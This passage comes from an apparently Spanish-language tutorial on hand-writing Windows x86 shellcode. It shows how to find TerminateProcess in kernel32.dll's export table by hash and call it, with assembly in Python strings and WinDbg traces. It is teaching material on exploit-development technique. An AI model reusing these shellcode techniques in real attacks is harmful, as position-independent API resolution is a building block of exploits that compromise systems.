&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=76c7d33c ebx=76c00000 ecx=00000648 edx=00ea0000 esi=76c8968a edi=76c7b9f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00ea004e esp=020cfd50 ebp=020cff74 iopl=0         nv up ei pl nz na po nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea004e 31c0            xor     eax,eax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; da @esi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;76c8968a  &amp;quot;timeGetTime&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 2 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00000000 ebx=76c00000 ecx=00000648 edx=998eaf95 esi=76c89696 edi=76c7b9f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00ea005e esp=020cfd50 ebp=020cff74 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00ea005e 61              popad
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; r edx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;edx=998eaf95
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Ahora que hemos implementado el algoritmo, debemos saber cómo obtener el RVA y VMA del símbolo para poder usarlo en nuestro shellcode.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;obtener-vma-de-una-funcion&quot;&gt;Obtener VMA de una función&lt;a class=&quot;zola-anchor&quot; href=&quot;#obtener-vma-de-una-funcion&quot; aria-label=&quot;Anchor link for: obtener-vma-de-una-funcion&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Una vez que llegamos a la última instrucción de nuestro shellcode anterior, el hash calculado se almacena en el registro EDX.&lt;&#x2F;p&gt;
&lt;p&gt;Esto significa que podemos introducir una función adicional que comparará el hash de EDX con el generado por nuestro script de Python. Si los hashes coinciden, podemos reutilizar el mismo índice de ECX en el array AddressOfNameOrdinals y obtener el nuevo índice. Esto nos permitirá obtener el RVA y, finalmente, el VMA de la función.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ python computehash.py TerminateProcess
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0x78b5b983
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El código quedaría de la siguiente manera:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;start:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;int3;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ebp, esp;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;sub esp, 0x200;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call find_kernel32;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push 0x78b5b983;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; hash de teminateProcess
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call find_function;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor ecx, ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; ecx nulo
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; uExitCode
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push 0xffffffff;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; hprocess
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Llamar a TerminateProcess
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;     &lt;span class=&quot;z-constant z-language z-python&quot;&gt;...&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_function_compare:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;cmp edx, [esp+0x24];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Comparar el hash generado con el solicitado
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;jnz find_function_loop;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Si no coincide vuelve a find_function_loop
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;     &lt;span class=&quot;z-constant z-language z-python&quot;&gt;...&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_function_finished:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;popad;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;ret;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El primer cambioque tiene nuestro shellcode es la función de inicio, antes de llamar a &lt;code&gt;find_function&lt;&#x2F;code&gt;, mandamos a pila mediante &lt;code&gt;push&lt;&#x2F;code&gt; el hash de &lt;code&gt;TerminateProcess&lt;&#x2F;code&gt;, esto nos permite recuperarlo posteriormente y compararlo con la función.&lt;&#x2F;p&gt;
&lt;p&gt;Tras el retorno de &lt;code&gt;find_function&lt;&#x2F;code&gt;, insertamos en la pila los dos argumentos que requiere la función destino.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp z-code&quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;BOOL&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function z-c++&quot;&gt;&lt;span class=&quot;z-meta z-toc-list z-full-identifier z-c++&quot;&gt;&lt;span class=&quot;z-entity z-name z-function z-c++&quot;&gt;TerminateProcess&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c++&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;  &lt;span class=&quot;z-meta z-brackets z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c++&quot;&gt;[&lt;&#x2F;span&gt;in&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c++&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;HANDLE&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;hProcess&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;  &lt;span class=&quot;z-meta z-brackets z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c++&quot;&gt;[&lt;&#x2F;span&gt;in&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c++&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;UINT&lt;&#x2F;span&gt;   uExitCode
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c++&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Invocamos una llama indirecta a EAX.&lt;&#x2F;p&gt;
&lt;p&gt;Para que esto pueda funcionar, colocamos el VMA de &lt;code&gt;TerminateProcess&lt;&#x2F;code&gt; en EAX antes del retorno de la función &lt;code&gt;find_function&lt;&#x2F;code&gt;. Una vez que se ha calculado nuestro hash, ejecutamos la función &lt;code&gt;find_function_compare&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;find_function_compare:&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;cmp edx, [esp+0x24];&amp;quot;    # Comparar el hash generado con el solicitado
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;jnz find_function_loop;&amp;quot; # Si no coincide vuelve a find_function_loop
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mov edx, [edi+0x24];&amp;quot;    # AddressOfNameOrdinals RVA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;add edx, ebx;&amp;quot;           # AddressOfNameOrdinals VMA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mov cx, [edx+2*ecx];&amp;quot;    # Extrapolar la funcion ordinal
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mov edx, [edi+0x1c];&amp;quot;    # AddressOfFunctions RVA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;add edx, ebx;&amp;quot;           # AddressOfFunctions VMA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mov eax, [edx+4*ecx];&amp;quot;   # obtener RVA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;add eax, ebx ;&amp;quot;          # obtener VMA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mov [esp+0x1c], eax;&amp;quot;    # Sobrescribir la versión de pila de eax desde pushad 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Primero, esta funciónm compara EDX con el valor apuntado por ESP en el desplazamiento &lt;code&gt;0x24&lt;&#x2F;code&gt;, no olvidemos que en EDX está almacenado nuestro hash, que mandamos previamente a la pila (&lt;code&gt;add edx, eax;&lt;&#x2F;code&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;Para que esta función tenga éxito, debemos aseegurarmos de que la dirección de memoria de ESP &lt;code&gt;0x24&lt;&#x2F;code&gt; apunte al hash que hemos generado.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Hay que tener en cuenta que el desplazamiento con el registro ESP variará según el códio shell y la cantidad de instrucciones &lt;code&gt;push&#x2F;pop&lt;&#x2F;code&gt; que se utilizen&lt;&#x2F;em&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Si los hashes comparados no coinciden, retrocedemos a &lt;code&gt;find_function_loop&lt;&#x2F;code&gt; y obtenemos la siguiente entrada del array &lt;code&gt;AddressOfNames&lt;&#x2F;code&gt;. Una vez que tengamos la entrada correcta, obtenemos el rva de &lt;code&gt;AddressOfNameOrdinals&lt;&#x2F;code&gt;, en el desplazamiento &lt;code&gt;0x24&lt;&#x2F;code&gt; de la tabla de directorios de exportación que se almacena en EDI. La siguiente instrucción calcula la VMA de &lt;code&gt;AddressOfNameOrdinals&lt;&#x2F;code&gt; con ebx, que recordemos contiene la dirección base de kernel32.dll.&lt;&#x2F;p&gt;
&lt;p&gt;A esto le siguien estas operaciones:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mov cx, [edx+2*ecx];&amp;quot;    # Extrapolar la funcion ordinal
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mov edx, [edi+0x1c];&amp;quot;    # AddressOfFunctions RVA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;add edx, ebx;&amp;quot;           # AddressOfFunctions VMA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mov eax, [edx+4*ecx];&amp;quot;   # obtener RVA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;add eax, ebx ;&amp;quot;          # obtener VMA
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;mov [esp+0x1c], eax;&amp;quot;    # Sobrescribir la versión de pila de eax desde pushad
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;ECX también se usara como índice de la matriz &lt;code&gt;AddressOfNames&lt;&#x2F;code&gt; como parte de nuestra función &lt;code&gt;find_function_loop&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Debido a que &lt;code&gt;AddressOfNames&lt;&#x2F;code&gt; y las entradas de las matrices &lt;code&gt;AddressOfNameOrdinals&lt;&#x2F;code&gt; usan el mismo índice, una vez que encontramos la entrada para nuestro nombre de símbolo, podemos usar el mismo índice para recuperar la entrada de las matriz &lt;code&gt;AddressOfNameOrdinals&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Multiplicamos ECX por &lt;code&gt;0x02&lt;&#x2F;code&gt; porque cada entrada en la matriz es un WORD.&lt;&#x2F;p&gt;
&lt;p&gt;Luego, trasladamos el valor del array &lt;code&gt;AddressOfNameOrdinals&lt;&#x2F;code&gt; al registro CX, que era nuestro contador&#x2F;índice. Usaremos este nuevo valor como un nuevo índice en el array &lt;code&gt;AddressOfFunctions&lt;&#x2F;code&gt; .&lt;&#x2F;p&gt;
&lt;p&gt;Antes de usar el nuevo índice, recopilamos la RVA de &lt;code&gt;AddressOfFunctions&lt;&#x2F;code&gt;  en el desplazamiento &lt;code&gt;0x1c&lt;&#x2F;code&gt; y con &lt;code&gt;add edx, ebx;&lt;&#x2F;code&gt; obtenemos la VMA, ya que agregamos la direccion base de kernel32.dll que se encuentra en EBX.&lt;&#x2F;p&gt;
&lt;p&gt;Vamos a establecer  un punto de interrupción en &lt;code&gt;edx,dword ptr [edi+24h]&lt;&#x2F;code&gt; para comprobar que se alcanza la función TerminateProcess de forma correcta.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; bp 007e0070
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 0 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00000000 ebx=76c00000 ecx=00000593 edx=78b5b983 esi=76c886b3 edi=76c7b9f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=007e0070 esp=020dfd4c ebp=020dff74 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e0070 8b5724          mov     edx,dword ptr [edi+24h] ds:0023:76c7ba14=0007ec60
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u @eip la
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;007e0070 8b5724          mov     edx,dword ptr [edi+24h]
